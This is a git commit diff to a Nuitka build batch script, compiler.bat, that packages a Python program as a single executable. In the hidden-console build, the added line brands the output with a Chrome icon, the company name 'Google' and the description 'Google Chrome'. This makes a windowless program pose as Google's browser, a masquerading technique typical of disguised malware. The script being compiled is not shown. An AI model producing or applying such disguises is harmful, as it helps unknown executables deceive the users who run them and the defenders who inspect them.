9f25de3cfbb983b5be3f5fc323b379fd8d2f15bb
Shayan Mad Man <145169432+ShayanMadMan@users.noreply.github.com>
2023-10-17 20:41:53 +0330

    Update compiler.bat
    add Icon and Assembly Info
    only for No Console build

--- compiler.bat
+++ compiler.bat
@@ -16,9 +16,9 @@ if "%compression%" == "y" (
 )
 
 if "%console%" == "y" (
-    nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console %file%
+    nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console --windows-icon-from-ico=chrome.ico --windows-company-name=Google --windows-file-version=1.0.0.1 --windows-file-description="Google Chrome"  %file%
 ) else (
-    nuitka --onefile --plugin-enable=multiprocessing %file%
+    nuitka --onefile --plugin-enable=multiprocessing  %file%
 )
 
 pause
